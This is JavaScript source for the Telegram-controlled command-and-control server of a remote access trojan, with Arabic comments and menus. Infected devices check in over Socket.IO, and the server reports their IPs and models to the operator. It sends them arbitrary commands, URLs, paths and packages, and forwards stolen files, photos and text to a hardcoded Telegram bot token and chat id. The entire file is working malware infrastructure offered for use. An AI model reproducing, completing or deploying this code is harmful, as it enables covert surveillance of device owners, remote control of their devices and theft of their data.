const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const telegramBot = require('node-telegram-bot-api');
const https = require('https');
const multer = require('multer');
const cmds = require('./commands');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();

// ==========================================
// البيانات محقونة مباشرة لتجاوز أخطاء الملفات
// ==========================================
const data = {
    token: "8804148065:AAGS3pj_6QiKcukKOaJOqeT_y0F9O7xWUjA",
    id: "8737619314",
    host: "https://github.com/rshadhackers2/Telegram-Rat-Arabic",
    text: "premium feature",
    adminUsername: "@king_1_4",
    channel: "t.me/Abu_Yamani",
    beaconIntervalMs: 5000,
    version: "2027.1"
};

const bot = new telegramBot(data.token, { polling: true });
const appData = new Map();

// التقاط أي خطأ عشان ما يطيح السيرفر بصمت
process.on('unhandledRejection', (reason) => {
    console.error('Unhandled Rejection:', reason);
});
process.on('uncaughtException', (err) => {
    console.error('Uncaught Exception:', err.message);
});

// ==========================================
// دوال مساعدة
// ==========================================
function emitTo(target, event, payload) {
    if (target === 'all' || !target) {
        io.emit(event, payload);
    } else if (io.sockets.sockets.get(target)) {
        io.to(target).emit(event, payload);
    }
}

function replyDone(extra = '') {
    bot.sendMessage(data.id,
        `<b>⌖ الطلب نُفّذ بنجاح ${extra}\n\n⌖ عودة إلى القائمة الرئيسية</b>\n\n`,
        { parse_mode: 'HTML', reply_markup: { keyboard: [['⌖ الأجهزة المتصلة', '⌖ التحكم'], ['⌖ عن لنا']], resize_keyboard: true } });
}

function askInput(prompt) {
    bot.sendMessage(data.id, `<b>${prompt}</b>\n\n`, {
        parse_mode: 'HTML',
        reply_markup: { keyboard: [['⌖ إرسال']], resize_keyboard: true, one_time_keyboard: true }
    });
}

// ==========================================
// الراوترات
// ==========================================
app.use(express.json());

app.post('/upload', uploader.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('no file');
    const target = req.body.target || 'unknown';
    bot.sendDocument(data.id, req.file.buffer, {
        caption: `<b>📁 ملف مستلم من → ${target}</b>`,
        parse_mode: 'HTML'
    }, { filename: req.file.originalname, contentType: 'application/octet-stream' });
    res.send('Done');
});

// ==========================================
// Socket.IO
// ==========================================
io.on('connection', (socket) => {
    const hdr = socket.handshake.headers;
    const botId = `${hdr['x-forwarded-for'] || 'local'}-${io.engine.clientsCount}`;
    const ip = hdr['x-forwarded-for'] || socket.handshake.address || 'unknown';
    const model = hdr['model'] || hdr['user-agent'] || 'unknown';

    socket.botId = botId;
    socket.ipAddr = ip;
    socket.model = model;

    bot.sendMessage(data.id, `<b>⌖ جهاز جديد متصل</b>\n\nID → ${botId}\nIP → ${ip}\nالجهاز → ${model}\n`, { parse_mode: 'HTML' });

    socket.on('disconnect', () => {
        bot.sendMessage(data.id, `<b>⌖ جهاز انقطع الاتصال</b>\n\nID → ${botId}\n`, { parse_mode: 'HTML' });
    });

    socket.on('result', (payload) => {
        try {
            if (!payload || !payload.type) return;
            const { type, text, base64, filename } = payload;
            if (type === 'text' && text) {
                bot.sendMessage(data.id, `<b>⌖ نتيجة من ${botId}:</b>\n\n${text}`, { parse_mode: 'HTML' });
            } else if (type === 'photo' && base64) {
                bot.sendPhoto(data.id, Buffer.from(base64, 'base64'), { caption: `📸 من ${botId}` });
            } else if (type === 'file' && base64) {
                bot.sendDocument(data.id, Buffer.from(base64, 'base64'), { caption: `📁 ${filename || 'file'}` });
            }
        } catch (e) {
            console.error('result error:', e.message);
        }
    });
});

// ==========================================
// أوامر البوت
// ==========================================
bot.on('message', (msg) => {
    const text = msg.text;
    if (!text) return;

    if (text === '/start') {
        bot.sendMessage(data.id,
            `<b>⌖ مرحبا بك في بوت v${data.version}</b>\n\n⌖ القناة: ${data.channel}\n⌖ المطور: ${data.adminUsername}\n\nاختر من القائمة:</b>\n\n`,
            { parse_mode: 'HTML', reply_markup: cmds.buildMainKeyboard() });
        return;
    }

    if (cmds.SECTIONS[text]) {
        if (!appData.get('currentTarget')) {
            bot.sendMessage(data.id, '<b>⌖ اختر جهازاً أولاً من ⌖ التحكم</b>', { parse_mode: 'HTML' });
            return;
        }
        bot.sendMessage(data.id, `<b>${text} — اختر الأمر:</b>`, { parse_mode: 'HTML', reply_markup: cmds.buildSectionKeyboard(text) });
        return;
    }

    if (text === '🔙 رجوع') {
        bot.sendMessage(data.id, '<b>⌖ القائمة الرئيسية</b>', { parse_mode: 'HTML', reply_markup: cmds.buildMainKeyboard() });
        return;
    }

    const cmd = cmds.findCommand(text);
    if (cmd) {
        const target = appData.get('currentTarget');
        if (!target) {
            bot.sendMessage(data.id, '<b>⌖ اختر جهازاً أولاً</b>', { parse_mode: 'HTML' });
            return;
        }
        if (cmds.INPUT_PROMPTS[cmd]) {
            appData.set('pendingCmd', cmd);
            appData.set('currentAction', 'awaitInput');
            askInput(cmds.INPUT_PROMPTS[cmd]);
            return;
        }
        emitTo(target, 'commend', { request: cmd, extras: [] });
        replyDone(`→ ${text}`);
        return;
    }

    if (appData.get('currentAction') === 'awaitInput') {
        const target = appData.get('currentTarget');
        const pending = appData.get('pendingCmd');
        const val = text || '';
        const extras = [
            { key: 'text', value: val }, { key: 'number', value: val }, { key: 'duration', value: val },
            { key: 'url', value: val }, { key: 'path', value: val }, { key: 'command', value: val },
            { key: 'package', value: val }, { key: 'content', value: val }
        ];
        emitTo(target, 'commend', { request: pending, extras });
        appData.delete('pendingCmd');
        appData.delete('currentAction');
        replyDone(`→ ${pending}`);
        return;
    }

    if (text === '⌖ الأجهزة المتصلة') {
        const socks = io.sockets.sockets;
        if (socks.size === 0) {
            bot.sendMessage(data.id, '<b>⌖ لا تتوفر أجهزة متصلة ✖️</b>', { parse_mode: 'HTML' });
            return;
        }
        let out = `<b>⌖ عدد الأجهزة المتصلة: ${socks.size}</b>\n\n`;
        let i = 1;
        socks.forEach((s) => {
            out += `<b>⌖ جهاز ${i}</b>\nID → ${s.botId || s.id}\nIP → ${s.ipAddr || '?'}\nالجهاز → ${s.model || '?'}\n\n`;
            i++;
        });
        bot.sendMessage(data.id, out, { parse_mode: 'HTML' });
        return;
    }

    if (text === '⌖ التحكم') {
        const socks = io.sockets.sockets;
        if (socks.size === 0) {
            bot.sendMessage(data.id, '<b>⌖ لا تتوفر أجهزة متصلة ✖️</b>', { parse_mode: 'HTML' });
            return;
        }
        const rows = [];
        socks.forEach((s) => rows.push([s.botId || s.id]));
        rows.push(['all']);
        rows.push(['⌖ عن لنا']);
        bot.sendMessage(data.id, '<b>⌖ اختر جهازاً للتنفيذ:</b>', { parse_mode: 'HTML', reply_markup: { keyboard: rows, resize_keyboard: true, one_time_keyboard: true } });
        return;
    }

    if (io.sockets.sockets.has(text) || text === 'all') {
        appData.set('currentTarget', text);
        bot.sendMessage(data.id, `<b>⌖ تم اختيار: ${text}</b>\nاختر الأمر:`, { parse_mode: 'HTML', reply_markup: cmds.buildMainKeyboard() });
        return;
    }

    if (text === '⌖ عن لنا') {
        bot.sendMessage(data.id, `<b>⌖ ${data.channel}\n⌖ المطور: ${data.adminUsername}\n⌖ الإصدار: ${data.version}</b>`, { parse_mode: 'HTML', reply_markup: cmds.buildMainKeyboard() });
        return;
    }
});

// ==========================================
// التشغيل
// ==========================================
setInterval(() => {
    io.sockets.sockets.forEach((s) => io.to(s.id).emit('ping', {}));
}, data.beaconIntervalMs || 5000);

server.listen(process.env.PORT || 3000, () => {
    console.log(`[v${data.version}] Listening on port 3000`);
});
